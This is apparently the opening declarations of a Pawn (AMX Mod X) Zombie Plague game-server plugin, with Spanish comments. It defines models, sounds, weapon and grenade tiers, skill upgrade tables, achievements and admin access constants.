// Plugin Version
new const PLUGIN_VERSION[] = "3.9.65 BETA"

// Delay for Change Models (5.0 * value)
const Float:gMODEL_CHANGE_DELAY = 1.1

// Armas editadas para cuando DROPEA (DESCOMENTAR SI ES ASÍ).
//#define WEAPONS_EDIT_FOR_DROP

// Molotov Activada (DESCOMENTAR SI ES ASÍ).
//#define MOLOTOV_ON

const EXTRAOFFSET_WEAPONS = 4 
const OFFSET_CLIPAMMO = 51 
  
new bool:user_shoot[33]

/*

*/

// All customization settings have been moved
// to external files to allow easier editing
new const ZP_CUSTOMIZATION_FILE[] = "zombieplague.ini"
new const ZP_ZOMBIECLASSES_FILE[] = "zp_zombieclasses.ini"
new const ZP_HUMANCLASSES_FILE[] = "zp_humanclasses.ini"

// Player Models
new const gMODEL_NEMESIS[] = "tcs_nemesis_1"
new const gMODEL_SURVIVOR[] = "tcs_survivor_1"
new const gMODEL_JASON[] = "tcs_jason_1"
new const gMODEL_WESKER[] = "tcs_wesker_1"
new const gMODEL_TROLL[] = "tcs_zombie_10"

// Weapon Models
new const gCHAINSAW_V[] = "models/zombie_plague/tcs_v_chainsaw.mdl"
new const gCHAINSAW_P[] = "models/zombie_plague/tcs_p_chainsaw.mdl"

// Custon Sounds
new const gCHAINSAW_SOUNDS[][] =
{
	"zombie_plague/tcs_cs_deploy.wav",		// Deploy Sound (knife_deploy1.wav)
	"zombie_plague/tcs_cs_hit1.wav",		// Hit 1 (knife_hit1.wav)
	"zombie_plague/tcs_cs_hit2.wav",		// Hit 2 (knife_hit2.wav)
	"zombie_plague/tcs_cs_hit1.wav",		// Hit 3 (knife_hit3.wav)
	"zombie_plague/tcs_cs_hit2.wav",		// Hit 4 (knife_hit4.wav)
	"zombie_plague/tcs_cs_hitwall.wav",		// Hit Wall (knife_hitwall1.wav)
	"zombie_plague/tcs_cs_miss.wav",		// Slash 1 (knife_slash1.wav)
	"zombie_plague/tcs_cs_miss.wav",		// Slash 2 (knife_slash2.wav)
	"zombie_plague/tcs_cs_stab.wav"			// Stab (knife_stab1.wav)
}

// Old Knife Sounds (DON'T CHANGE)
new const gOLDKNIFE_SOUNDS[][] =
{
	"weapons/knife_deploy1.wav",	// Deploy Sound
	"weapons/knife_hit1.wav",		// Hit 1
	"weapons/knife_hit2.wav",		// Hit 2
	"weapons/knife_hit3.wav",		// Hit 3
	"weapons/knife_hit4.wav",		// Hit 4
	"weapons/knife_hitwall1.wav",	// Hit Wall
	"weapons/knife_slash1.wav",		// Slash 1
	"weapons/knife_slash2.wav",		// Slash 2
	"weapons/knife_stab.wav"		// Stab
}

new const gSOUND_WIN_ZOMBIES[] = "zombie_plague/tcs_win_zombies_4.wav"
new const gSOUND_WIN_HUMANS[] = "zombie_plague/tcs_win_humans_4.wav"
new const gSOUND_NO_WIN_ONE[] = "ambience/3dmstart.wav"
new const gSOUND_ZOMBIE_INFECT[][] = {
	"zombie_plague/tcs_zombie_infect_1.wav",
	"zombie_plague/zombie_infec1.wav",
	"zombie_plague/zombie_infec2.wav",
	"zombie_plague/tcs_zombie_infect_2.wav",
	"zombie_plague/zombie_infec3.wav",
	"scientist/c1a0_sci_catscream.wav",
	"zombie_plague/tcs_zombie_infect_3.wav",
	"scientist/scream01.wav",
	"zombie_plague/tcs_alert_1.wav"
}
new const gSOUND_ZOMBIE_PAIN[][] = {
	"zombie_plague/zombie_pain1.wav",
	"zombie_plague/zombie_pain2.wav",
	"zombie_plague/zombie_pain3.wav",
	"zombie_plague/zombie_pain4.wav",
	"zombie_plague/zombie_pain5.wav"
}
new const gSOUND_NEMESIS_PAIN[][] = {
	"zombie_plague/nemesis_pain1.wav",
	"zombie_plague/nemesis_pain2.wav",
	"zombie_plague/nemesis_pain3.wav"
}
new const gSOUND_ZOMBIE_DIE[][] = {
	"zombie_plague/tcs_zombie_die_1.wav",
	"zombie_plague/zombie_die1.wav",
	"zombie_plague/zombie_die2.wav",
	"zombie_plague/tcs_zombie_die_2.wav",
	"zombie_plague/zombie_die3.wav",
	"zombie_plague/zombie_die4.wav",
	"zombie_plague/zombie_die5.wav"
}
new const gSOUND_ZOMBIE_MISS_SLASH[][] = { // COMPLETAR - AGREGAR NUEVOS
	"weapons/knife_slash1.wav",
	"weapons/knife_slash2.wav"
}
new const gSOUND_ZOMBIE_MISS_WALL[] = "weapons/knife_hitwall1.wav"
new const gSOUND_ZOMBIE_HIT_NORMAL[][] = {
	"weapons/knife_hit1.wav",
	"weapons/knife_hit2.wav",
	"weapons/knife_hit3.wav",
	"weapons/knife_hit4.wav"
}
new const gSOUND_ZOMBIE_HIT_STAB[] = "weapons/knife_stab.wav"
new const gSOUND_ZOMBIE_IDLE[][] = {
	"nihilanth/nil_now_die.wav",
	"nihilanth/nil_slaves.wav",
	"nihilanth/nil_alone.wav",
	"zombie_plague/tcs_alert_2.wav",
	"zombie_plague/zombie_brains1.wav",
	"zombie_plague/zombie_brains2.wav",
	"zombie_plague/tcs_alert_3.wav"
}
new const gSOUND_ZOMBIE_IDLE_LAST[] = "nihilanth/nil_thelast.wav"
new const gSOUND_ZOMBIE_MADNESS[] = "zombie_plague/zombie_madness1.wav"
new const gSOUND_ROUND_NEMESIS[][] = { // AL AZAR PARA EL PLAGUE
	"zombie_plague/nemesis1.wav",
	"zombie_plague/nemesis2.wav"
}
new const gSOUND_ROUND_SURVIVOR[][] = { // AL AZAR PARA EL PLAGUE
	"zombie_plague/survivor1.wav",
	"zombie_plague/survivor2.wav"
}
new const gSOUND_ROUND_SWARM[] = "ambience/the_horror2.wav" // MISMO QUE EL MULTI
new const gSOUND_INFECT_EXPLODE[] = "zombie_plague/grenade_infect.wav"
new const gSOUND_INFECT_PLAYER[][] = {
	"scientist/scream20.wav",
	"scientist/scream22.wav",
	"scientist/scream05.wav"
}
new const gSOUND_GRENADE_FIRE_EXPLODE[] = "zombie_plague/grenade_explode.wav"
new const gSOUND_FIRE_PLAYER[][] = {
	"zombie_plague/zombie_burn3.wav",
	"zombie_plague/zombie_burn4.wav",
	"zombie_plague/zombie_burn5.wav",
	"zombie_plague/zombie_burn6.wav",
	"zombie_plague/zombie_burn7.wav"
}
new const gSOUND_GRENADE_FROST_EXPLODE[] = "warcraft3/frostnova.wav"
new const gSOUND_FROST_PLAYER[] = "warcraft3/impalehit.wav"
new const gSOUND_FROST_BREAK[] = "warcraft3/impalelaunch1.wav"
new const gSOUND_GRENADE_FLARE[] = "items/nvg_on.wav"
new const gSOUND_ANTIDOTE[] = "items/smallmedkit1.wav"

// Limiters for stuff not worth making dynamic arrays out of (increase if needed)
const MAX_CSDM_SPAWNS = 128

/*new iDateYMD[3], iTimeHMS[3];
date(iDateYMD[0], iDateYMD[1], iDateYMD[2])
time(iTimeHMS[0], iTimeHMS[1], iTimeHMS[2])
TimeToUnix( iDateYMD[0], iDateYMD[1], iDateYMD[2], iTimeHMS[0], iTimeHMS[1], iTimeHMS[2] )*/

#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <engine>
#include <fakemeta_util>
#include <fun>
#include <hamsandwich>
#include <xs>
#include <sqlx>
#include <dhudmessage>

new const ACCESS_MENU = ADMIN_LEVEL_A
new const ACCESS_MODE = ADMIN_LEVEL_A
new const ACCESS_MODE_2 = ADMIN_LEVEL_A

// CVARS
//new ArmageddonOn, ArmageddonChance;
/*new SynapsisOn, SynapsisChance;
new L4DOn, L4DChance;
new WeskerOn, WeskerChance;
new NinjaOn, NinjaChance;
new SniperOn, SniperChance;
new TaringaOn, TaringaChance;*/

// VARIABLES
new Handle:gSQL_TUPLE, gSQL_ERROR, gSQL_ERRORNUM[512];
new Handle:SQL_CONNECTION;
new gLogeado[33], gRegistrado[33];

new gDmgEcho[33], gDmgRec[33], gKills[33], gKillsRec[33], gInfects[33], gInfectsRec[33];

new ITEM_EXTRA_BalasInfinitas[33];
new ITEM_EXTRA_BalasPrecision[33];
new gBubbleMaxInArmag;
new Float:gReduceVel;
new gPowerOn;

new szMessage[191];
new gPlayerTeam[33], gPlayerSolid[33], gPlayerRestore[33];

new gHaveBazooka[33];
new gCanJump[33], gJumps[33];

new gChangeNick[33];
new gRecordVinc[33];
new Float:gAP_Percent[33];
new gClass[33][32];
new g_szCharLight[2];

new gArmageddonRound;
new gSynapsisRound;
new gPlayersL4D[33][4], gL4DRound;
new gWesker[33], gWeskerRound, gShootAniq[33];
new gJason[33], gJasonRound;
new gSniper[33], gSniperRound;
new gTaringaRound;
new gTroll[33], gTrollRound;

new gPowerFull[33];
new g_iStartMode[2];

new gLogro_CountKill[33];
new gLogro_Infects[33];
new gLogro_ElZombieNoDie[33];
new gLogro_ZombieDie[33];
new gLogro_CountDmg[33];

new gFuriaMax[33], gBombaMax[33];

new gLevel[33];
new const gRESET_CLASS[][] = { "-", "D", "C", "B", "A", "S" }
new gReset[33];
new gTH_Mult[33][2];
new gWinMult_Change[2] = { 0, 0 };
new gTH;

new gGananciaAcomodada = 0;

new COMBO_SQL_szName[32], gMaxComboGLOBAL;
new MJ_SQL_szName[32], MJ_SQL_iAmmoPacks, MJ_SQL_iLevel, MJ_SQL_iReset;

new gApost[33][2], gPozoAc;
new gYaAposto[33];
new gApostG[33][2];

new gREMOVE_ENTITIES[][] = { "func_bomb_target", "info_bomb_target", "info_vip_start", "func_vip_safetyzone", "func_escapezone", "hostage_entity",
"monster_scientist", "info_hostage_rescue", "func_hostage_rescue", "env_rain", "env_snow", "env_fog", "func_vehicle", "info_map_parameters", "func_buyzone", "armoury_entity" }

// LongJump
#define FBitSet(%1,%2)			(%1 & %2)

new g_bSuperJump
#define MarkUserLongJump(%1)	g_bSuperJump |= 1<<(%1 & 31)
#define ClearUserLongJump(%1)	g_bSuperJump &= ~( 1<<(%1 & 31) )
#define HasUserLongJump(%1)		g_bSuperJump &  1<<(%1 & 31)

enum
{
	TOP_GENERAL = 0,
	TOP_MUERTES,
	TOP_INFECCIONES,
	TOP_DANIO,
	
	TOP_TOTAL
}


enum
{
	ARMA_PRIMARIA = 0,
	ARMA_SECUNDARIA,
	
	TOTAL_ARMAS
}
enum
{
	// PRIMARIAS
	M3 = 16,
	MP5_NAVY,
	COLT,
	AK47,
	TMP,
	AUG,
	SG550,
	M3_2,
	MP5_NAVY_2,
	AK47_2,
	XM1014,
	COLT_2,
	M249
	
	// PRIMARIAS + SECUNDARIAS = 29
	// TOTAL = 13
}
enum
{
	// SECUNDARIAS
	GLOCK = 6,
	USP,
	P228,
	FIVESEVEN,
	ELITE,
	DEAGLE,
	GLOCK_2,
	USP_2,
	P228_2,
	FIVESEVEN_2,
	ELITE_2,
	DEAGLE_2 // 17
	
	// TOTAL = 12 
}
/*#if defined WEAPONS_EDIT_FOR_DROP
enum( += 101100 )
{
	_M3 = 101100, 	// OK
	_MP5_NAVY,		// OK
	_COLT,			// OK
	_AK47,			// DOWN
	_TMP,			// OK
	_AUG,			// OK
	_SG550,			// OK
	_M3_2,			// OK
	_MP5_NAVY_2,	// OK
	_AK47_2,		// OK
	_XM1014,		// OK
	_COLT_2,		// OK
	_M249,			// OK
	_GLOCK,			// OK
	_USP,			// OK
	_P228,			// DOWN
	_FIVESEVEN,		// OK
	_ELITE,			// DOWN
	_DEAGLE,		// OK
	_GLOCK_2,		// OK
	_USP_2,			// OK
	_P228_2,		// DOWN
	_FIVESEVEN_2,	// DOWN
	_ELITE_2,		// DOWN
	_DEAGLE_2		// OK
}
#endif*/
enum
{
	GRENADE_INFECTION = 0,
	GRENADE_NAPALM,
	GRENADE_FROST,
	GRENADE_SUPERNOVA,
	
	GRENADE_ALLS
}
/*#if defined WEAPONS_EDIT_FOR_DROP
new const WeaponEditNames[][] = { "weapon_m3", "weapon_mp5navy", "weapon_m4a1", "weapon_ak47", "weapon_tmp", "weapon_aug", "weapon_sg550", "weapon_xm1014",
"weapon_m249", "weapon_glock18", "weapon_usp", "weapon_p228", "weapon_fiveseven", "weapon_elite", "weapon_deagle" }
#endif*/
new gWeapon[33][TOTAL_ARMAS][30];
new gWeaponsEdit[33][TOTAL_ARMAS];
new gPrimaryWeapon[33];

new const vWeapModels[][] = 
{ 
	"models/tcs_m3_1/v_tcs_m3_1.mdl", "models/tcs_m3_2/v_tcs_m3_2.mdl",
	"models/tcs_mp5navy_1/v_tcs_mp5navy_1.mdl", "models/tcs_mp5navy_2/v_tcs_mp5navy_2.mdl",
	"models/tcs_colt_1/v_tcs_colt_1.mdl", "models/tcs_colt_2/v_tcs_colt_2.mdl",
	"models/tcs_ak47_2/v_tcs_ak47_2.mdl",
	"models/tcs_tmp_1/v_tcs_tmp_1.mdl",
	"models/tcs_aug_1/v_tcs_aug_1.mdl",
	"models/tcs_sg550_1/v_tcs_sg550_1.mdl",
	"models/tcs_xm1014_1/v_tcs_xm1014_1.mdl",
	"models/tcs_m249_1/v_tcs_m249_1.mdl",
	"models/tcs_glock_1/v_tcs_glock_1.mdl", "models/tcs_glock_2/v_tcs_glock_2.mdl",
	"models/tcs_usp_1/v_tcs_usp_1.mdl", "models/tcs_usp_2/v_tcs_usp_2.mdl",
	"models/tcs_fiveseven_1/v_tcs_fiveseven_1.mdl",
	"models/tcs_deagle_1/v_tcs_deagle_1.mdl", "models/tcs_deagle_2/v_tcs_deagle_2.mdl"
}
/*new const pWeapModels[][] = 
{ 
	"models/tcs_m3_1/p_tcs_m3_1.mdl", "models/tcs_m3_2/p_tcs_m3_2.mdl",
	"models/tcs_mp5navy_1/p_tcs_mp5navy_1.mdl", "models/tcs_mp5navy_2/p_tcs_mp5navy_2.mdl",
	"models/tcs_colt_1/p_tcs_colt_1.mdl", "models/tcs_colt_2/p_tcs_colt_2.mdl",
	"models/tcs_ak47_2/p_tcs_ak47_2.mdl",
	"models/tcs_tmp_1/p_tcs_tmp_1.mdl",
	"models/tcs_aug_1/p_tcs_aug_1.mdl",
	"models/tcs_sg550_1/p_tcs_sg550_1.mdl",
	"models/tcs_xm1014_1/p_tcs_xm1014_1.mdl",
	"models/tcs_m249_1/p_tcs_m249_1.mdl",
	"models/tcs_glock_1/p_tcs_glock_1.mdl", "models/tcs_glock_2/p_tcs_glock_2.mdl",
	"models/tcs_usp_1/p_tcs_usp_1.mdl", "models/tcs_usp_2/p_tcs_usp_2.mdl",
	"models/tcs_fiveseven_1/p_tcs_fiveseven_1.mdl",
	"models/tcs_deagle_1/p_tcs_deagle_1.mdl", "models/tcs_deagle_2/p_tcs_deagle_2.mdl" 
}*/

new NameGranadasLV[5][] =
{	
	"\dFuego \r- \dHielo \r-\d Luz",
	#if defined MOLOTOV_ON
	"\dMolotov chica \r- \dHielo \r-\d Luz",
	"\dMolotov \r- \dHielo \r-\dBubble", 
	"\dMolotov grande \r- \dSuperNova \r- \dBubble", 
	"\dMolotov grande \r- \d2 SuperNova \r- \d2 Bubble"
	#else
	"\d2 Fuego \r- \dHielo \r-\d Luz",
	"\d2 Fuego \r- \dHielo \r-\dBubble", 
	"\d2 Fuego \r- \dSuperNova \r- \dBubble", 
	"\d3 Fuego \r- \d2 SuperNova \r- \d2 Bubble"
	#endif
}
new NameGranadas[5][] =
{	
	"\wFuego \r- \wHielo \r- \wLuz", 
	#if defined MOLOTOV_ON
	"\wMolotov chica \r- \wHielo \r- \wLuz",
	"\wMolotov \r- \wHielo \r- \wBubble", 
	"\wMolotov grande \r- \wSuperNova \r- \wBubble", 
	"\w2 Molotov grande \r- \w2 SuperNova \r- \w2 Bubble"
	#else
	"\w2 Fuego \r- \wHielo \r- \wLuz",
	"\w2 Fuego \r- \wHielo \r- \wBubble", 
	"\w2 Fuego \r- \wSuperNova \r- \wBubble", 
	"\w3 Fuego \r- \w2 SuperNova \r- \w2 Bubble"
	#endif
}
new WeaponGranadas[3][] = { "weapon_hegrenade", "weapon_flashbang", "weapon_smokegrenade" }
new AmmoGranadas[3] = { CSW_HEGRENADE, CSW_FLASHBANG, CSW_SMOKEGRENADE }
#if defined MOLOTOV_ON
new AmmountGranadas[5][3] = { { 1, 1, 1 }, { 1, 1, 1 }, { 1, 1, 1 }, { 1, 1, 1 }, { 2, 2, 2 } }
#else
new AmmountGranadas[5][3] = { { 1, 1, 1 }, { 2, 1, 1 }, { 2, 1, 1 }, { 2, 1, 1 }, { 3, 2, 2 } }
#endif
new LevelGranadas[5] = { 1, 75, 235, 360, 487 }

/// GRANADAS ELITE
new NameGranadasLV_ELITE[6][] =
{	
	"\d3 Fuego \r-\d 2 SuperNova \r- \d2 Bubble",
	"\d2 Fuego \r-\d Hielo E. \r-\d Bubble",
	"\d2 Fuego \r-\d 2 Hielo E. \r-\d Bubble",
	"\d2 Fuego \r-\d Locura \r-\d 2 Bubble",
	"\dDetún \r-\d Locura \r-\d 2 Bubble",
	"\dDetún \r-\d Locura \r-\d Bubble Hielo"
}
new NameGranadas_ELITE[6][] =
{	
	"\w3 Fuego \r-\w 2 SuperNova \r-\w 2 Bubble",
	"\w2 Fuego \r-\w Hielo E. \r-\w Bubble",
	"\w2 Fuego \r-\w 2 Hielo E. \r-\w Bubble",
	"\w2 Fuego \r-\w Locura \r-\w 2 Bubble",
	"\wDetún \r-\w Locura \r-\w 2 Bubble",
	"\wDetún \r-\w Locura \r-\w Bubble Hielo"
}
new AmmountGranadas_ELITE[6][3] = { { 3, 2, 2 }, { 2, 1, 1 }, { 2, 2, 1 }, { 2, 2, 1 }, { 2, 1, 2 }, { 1, 1, 1 } }
new LevelGranadas_ELITE[6] = { 1, 100, 200, 300, 400, 500 }
/// GRANADAS ELITE END

#if defined MOLOTOV_ON
new gMolotov[33][3], g_Molotov_offset[33];
new g_g, last_Molotov_ent;
#endif
new gSuperNova[33], gBubble[33];
new gImpact[33][GRENADE_ALLS], gShowMenu[33];

new gDamageCombo[33];
new gCombo[33];
new gMaxCombo[33];
new gComboMultiplier[33];
new gInfoCombo[33][128];

new gViewInvisible[33];
new bool:gMarkedInvisible[33] = { true, ...};

new Array:gPrimaryLevel, Array:gSecondaryLevel
new Array:gPrimaryReset, Array:gSecondaryReset

// OTHERS
new g_color_nvg[33][3], g_color_hud[33][3], Float:g_hud_xyc[33][3];

// CZero Tutor
enum
{
	RED = 1,// INFO
	BLUE, 	// CALAVERA
	YELLOW,	// INFO
	GREEN	// CALAVERA
}

enum
{
	HUMAN_HP = 0,
	HUMAN_SPEED,
	HUMAN_GRAVITY,
	HUMAN_DAMAGE,
	HUMAN_ARMOR,
	
	MAX_HUMAN_HABILITIES
}
enum
{
	ZOMBIE_HP = 0,
	ZOMBIE_SPEED,
	ZOMBIE_GRAVITY,
	ZOMBIE_DAMAGE,
	
	MAX_ZOMBIE_HABILITIES
}
enum
{
	SURVIVOR_DISPARO_SPEED = 0,
	SURVIVOR_ARMA_MEJORADA,
	SURVIVOR_INMUNIDAD_20SEG,
	
	MAX_SURVIVOR_HABILITIES
}
enum
{
	NEMESIS_LJ_SPEED = 0,
	NEMESIS_LJ_ALTURE,
	NEMESIS_GRAVITY,
	
	MAX_NEMESIS_HABILITIES
}
enum
{
	BUY_SURVIVOR = 0,
	BUY_JASON,
	BUY_WESKER,
	BUY_NEMESIS,
	BUY_TROLL,
	COMBOLANDIA,
	WESKER_COMBO_ENABLED,
	JASON_COMBO_ENABLED,
	
	MAX_SPECIAL_HABILITIES
}
enum
{
	HAB_HUMAN = 0,
	HAB_ZOMBIE,
	HAB_SURVIVOR,
	HAB_NEMESIS,
	HAB_SPECIAL,
	
	MAX_HAB
}

new gPoints[33][MAX_HAB];

// MAXIMOS NIVELES PARA LAS HABILIDADES
new const MAX_HAB_LEVEL[MAX_HAB][MAX_SPECIAL_HABILITIES] =
{
	{ // HUMANO
		30, // HP
		15, // SPEED
		15, // GRAV
		50, // DMG
		20, // ARMOR
		0,
		0,
		0
	},
	{ // ZOMBIE
		50, // HP
		15, // SPEED
		10, // GRAV
		20, // DMG
		0,  // ---
		0,  // ---
		0,  // ---
		0  // ---
	},
	{ // SURVIVOR
		5, // WEAPON SPEED
		2, // WEAPON STATS
		1, // IMMUNITY DURATION
		0, // ---
		0, // ---
		0, // ---
		0, // ---
		0  // ---
	},
	{ // NEMESIS
		5, // SPEED LJ
		5, // ALTURE LJ
		5, // GRAV
		0, // ---
		0, // ---
		0, // ---
		0, // ---
		0  // ---
	},
	{ // SPECIAL
		999, // COMPRAR SURVIVOR
		999, // COMPRAR JASON
		999, // COMPRAR WESKER
		999, // COMPRAR NEMESIS
		999, // COMPRAR TROLL
		1,   // COMBO EXTRA
		1,   // HABILITAR COMBO AL WESKER
		1   // HABILITAR COMBO AL JASON
	}
}

// EL PORCENTAJE MAXIMO DE CADA HABILIDAD
new const MAX_HAB_PERCENT[MAX_HAB][MAX_SPECIAL_HABILITIES] =
{
	{ // HUMANO
		300, // HP
		40,  // SPEED
		40,  // GRAV
		300, // DMG
		200, // ARMOR
		0,   // ---
		0,   // ---
		0   // ---
	},
	{ // ZOMBIE
		1000, // HP
		20,   // SPEED
		30,	  // GRAV
		75,   // DMG
		0,    // ---
		0,    // ---
		0,    // ---
		0     // ---
	},
	{ // SURVIVOR
		50, // WEAPON SPEED
		100, // WEAPON STATS
		100, // IMMUNITY DURATION
		0, // ---
		0, // ---
		0, // ---
		0, // ---
		0  // ---
	},
	{ // NEMESIS
		70, // SPEED LJ
		30, // ALTURE LJ
		30, // GRAV
		0, // ---
		0, // ---
		0, // ---
		0, // ---
		0  // ---
	},
	{ // SPECIAL
		100, // COMPRAR SURVIVOR
		100, // COMPRAR JASON
		100, // COMPRAR WESKER
		100, // COMPRAR NEMESIS
		100, // COMPRAR TROLL
		100, // COMBO EXTRA
		100, // HABILITAR COMBO AL WESKER
		100 // HABILITAR COMBO AL JASON
	}
}

new g_hab[33][MAX_HAB][MAX_SPECIAL_HABILITIES];
new MAX_HABILITIES[MAX_HAB];
new const LANG_HAB[MAX_HAB][] = { "HUMANOS", "ZOMBIES", "SURVIVOR", "NEMESIS", "ESPECIALES" }
new const LANG_HAB_M[MAX_HAB][] = { "Humanos", "Zombies", "Survivor", "Nemesis", "Especiales" }

new Array:A_HAB_MAX_LEVEL[MAX_HAB];
new Array:A_HAB_NAMES[MAX_HAB];
new Array:A_HAB_MAX_PERCENT[MAX_HAB];

new const LANG_HAB_CLASS[MAX_HAB][MAX_SPECIAL_HABILITIES][] =
{
	{ // HUMANO
		"VIDA",
		"VELOCIDAD",
		"GRAVEDAD",
		"DAÑO",
		"CHALECO",
		"",
		"",
		""
	},
	{ // ZOMBIE
		"VIDA",
		"VELOCIDAD",
		"GRAVEDAD",
		"DAÑO",
		"",
		"",
		"",
		""
	},
	{ // SURVIVOR
		"VELOCIDAD DE DISPARO",
		"ARMA MEJORADA",
		"DURACIÓN DE INMUNIDAD",
		"",
		"",
		"",
		"",
		""
	},
	{ // NEMESIS
		"VELOCIDAD DEL LONGJUMP",
		"ALTURA DEL LONGJUMP",
		"GRAVEDAD",
		"",
		"",
		"",
		"",
		""
	},
	{ // SPECIAL
		"COMPRAR SURVIVOR",
		"COMPRAR JASON",
		"COMPRAR WESKER",
		"COMPRAR NEMESIS",
		"COMPRAR TROLL",
		"AUMENTAR DURACION DEL COMBO",
		"HABILITAR COMBO DEL WESKER",
		"HABILITAR COMBO DEL JASON"
	}
}

get_percent_upgrade(id, class, hab) return (g_hab[id][class][hab] * ArrayGetCell(A_HAB_MAX_PERCENT[class], hab)) / ArrayGetCell(A_HAB_MAX_LEVEL[class], hab);
Float:ammount_upgradeF_special_mode(id, class, hab, Float:base)
{
	new Float:f_Percent;
	new Float:f_Habilitie;
	new Float:f_Return;
	
	f_Percent = float((g_hab[id][class][hab] * MAX_HAB_PERCENT[class][hab]));
	
	if(f_Percent <= 0.00) 
		f_Percent = 1.00; // Bug fix
	
	f_Percent /= float(MAX_HAB_LEVEL[class][hab])
	
	if(f_Percent <= 0.00)
		f_Percent = 1.00; // Bug fix
	
	f_Habilitie = (base * f_Percent) / 100.00;
	
	if(hab == NEMESIS_LJ_SPEED || hab == NEMESIS_LJ_ALTURE) f_Return = base + f_Habilitie;
	else f_Return = base - f_Habilitie;
	
	return f_Return;
}
ammount_upgrade(id, class, hab, base)
{
	new GetPercent = get_percent_upgrade(id, class, hab)
	new CurrentHab
	
	if(hab != HUMAN_ARMOR)
	{
		if(base < 1) base = 1 // Fix a posible bug
		CurrentHab = ( base * GetPercent ) / 100
	}
	
	new Ret = base + CurrentHab
	new iPs = 0;
	
	if(hab == HUMAN_ARMOR)
	{
		if(GetPercent < base) iPs = 1
		else iPs = 2
	}
	
	return (iPs == 1) ? base : (iPs == 2) ? GetPercent : Ret;
}
Float:ammount_upgradeF(id, class, hab, Float:base/*, Float:dmg*/)
{
	new Float:GetPercent;
	new Float:Ret;
	new Float:CurrentHab
	
	GetPercent = float(get_percent_upgrade(id, class, hab))
	
	//if(hab == HUMAN_DAMAGE || hab == ZOMBIE_DAMAGE) CurrentHab = ( ( base + GetPercent ) * dmg ) / 100.0
	if(hab == HUMAN_DAMAGE || hab == ZOMBIE_DAMAGE)
	{
		if(base < 1.0) base = 1.0
		CurrentHab = GetPercent
	}
	else CurrentHab = ( base * GetPercent ) / 100.0
	
	
	if(hab == HUMAN_GRAVITY || hab == ZOMBIE_GRAVITY) Ret = base - CurrentHab
	//else if(hab == HUMAN_DAMAGE || hab == ZOMBIE_DAMAGE) Ret = dmg + CurrentHab
	else Ret = base + CurrentHab
	
	return Ret;
}

#define next_point(%1) 			(%1 * 3) + 1
#define next_point_surv(%1) 	(%1+1) * 11
#define next_point_nem(%1) 		(%1+1) * 11
#define next_point_special(%1) 	(%1+1) * 300
//#define current_point(%1)	%1
//#define cost_down_point(%1)	(%1 * 30)

// LOGROS
#define DEF_LOGROS	"h0h0"

enum
{
	Array:LOGRO_HUMAN = 0,
	Array:LOGRO_ZOMBIE,
	
	MAX_CLASS
}
enum // HUMANS
{
	FULL_HAB_H = 0,
	COMBO_2500,
	COMBO_5000,
	COMBO_10000,
	KILL_20000,
	KILL_50000,
	KILL_100000,
	RESET,
	KILL_15_1_ROUND,
	KILL_25_1_ROUND,
	A_DONDE_VAS,
	A_CUCHILLO,
	AFILANDO_CUCHILLOS,
	CONTADOR_DE_DANIOS,
	MORIRE_EN_EL_INTENTO,
	
	MAX_HUMANS_LOGROS
}
enum // ZOMBIES
{
	FULL_HAB_Z = 0,
	INFECT_10000,
	INFECT_30000,
	INFECT_100000,
	LA_BOMBA_VERDE,
	NO_ME_VEZ,
	SOY_EL_ZOMBIE,
	ASI_NO_VA,
	
	MAX_ZOMBIES_LOGROS
}

new g_logro[33][MAX_CLASS][MAX_HUMANS_LOGROS];

new MAX_LOGROS_CLASS[MAX_CLASS]

new const LANG_HAB_L[MAX_CLASS][] = { "HUMANOS", "ZOMBIES" }
new const LANG_HAB_L_M[MAX_CLASS][] = { "Humanos", "Zombies" }
new const LANG_LOGROS_NAMES[MAX_CLASS][MAX_HUMANS_LOGROS][] =
{
	{ // HUMANO
		"EL HUMANOS MÁS FUERTE",
		"COMBO 2.500",
		"COMBO 5.000",
		"COMBO 10.000",
		"LOS 20.000 ZOMBIES",
		"LOS 50.000 ZOMBIES",
		"LOS 100.000 ZOMBIES",
		"LA PRIMERA VEZ",
		"MATADOR",
		"ANIQUILADOR",
		"¿ A DÓNDE VAS ?",
		"A CUCHILLO",
		"AFILANDO CUCHILLOS",
		"CONTADOR DE DAÑOS",
		"... O MORIRÉ EN EL INTENTO"
	},
	{ // ZOMBIE
		"EL ZOMBIE MÁS FUERTE",
		"LOS 10.000 HUMANOS",
		"LOS 30.000 HUMANOS",
		"LOS 100.000 HUMANOS",
		"LA BOMBA VERDE",
		"¿ NO ME VEZ ?",
		"SOY ÉL ZOMBIE",
		"ASI NO VA :(",
		"",
		"",
		"",
		"",
		"",
		"",
		""
	}
}
new const LANG_LOGROS_DESCRIPTION[MAX_CLASS][MAX_HUMANS_LOGROS][] =
{
	{ // HUMANO
		"Lleva las habilidades humanas al máximo",
		"Consigue un combo de 2.500 o más",
		"Consigue un combo de 5.000 o más",
		"Consigue un combo de 10.000 o más",
		"Mata a 20.000 zombies",
		"Mata a 50.000 zombies",
		"Mata a 100.000 zombies",
		"Consigue alcanzar la Clase D",
		"Mata a 15 zombies en 1 sola ronda",
		"Mata a 25 zombies en 1 sola ronda",
		"Congela a 10 zombies juntos o más",
		"Mata a un zombie con cuchillo",
		"Mata a un nemesis con cuchillo",
		"Realiza 250.000 o más de daño en una ronda",
		"Haz que te afecte el poder del Troll y sobrevive para contarlo"
	},
	{ // ZOMBIE
		"Lleva las habilidades zombies al máximo",
		"Infecta a 10.000 humanos",
		"Infecta a 30.000 humanos",
		"Infecta a 100.000 humanos",
		"Infecta a 15 o más humanos con una bomba de infección",
		"Infecta a 10 o más humanos en una ronda",
		"Gana el modo Primer Zombie siendo el primer zombie^ncon más de 19 jugadores vivos",
		"Muere 10 o más veces en una ronda",
		"",
		"",
		"",
		"",
		"",
		"",
		""
	}
}
new const LOGROS_REWARD_POINTS[MAX_CLASS][MAX_HUMANS_LOGROS] = 
{
	{
		5000,
		25,
		50,
		100,
		200,
		500,
		1000,
		15,
		15,
		25,
		10,
		10,
		20,
		25,
		50
	},
	{
		5000,
		100,
		300,
		1000,
		25,
		10,
		10,
		-10,
		0,
		0,
		0,
		0,
		0,
		0,
		0
	}
}

new Array:A_LOGROS_NAMES[MAX_CLASS];
new Array:A_LOGROS_DESCRIPTION[MAX_CLASS];
new Array:A_LOGROS_POINTS[MAX_CLASS];


#define ACCESS_SET_POINTS		ADMIN_RCON
#define ACCESS_SET_LEVELS		ADMIN_RCON
#define ACCESS_SET_AMMOS		ADMIN_RCON
#define ACCESS_SET_RESETS		ADMIN_RCON
#define ACCESS_SET_WIN_MULT		ADMIN_RCON
#define ACCESS_SET_LIGHTING		ADMIN_RCON
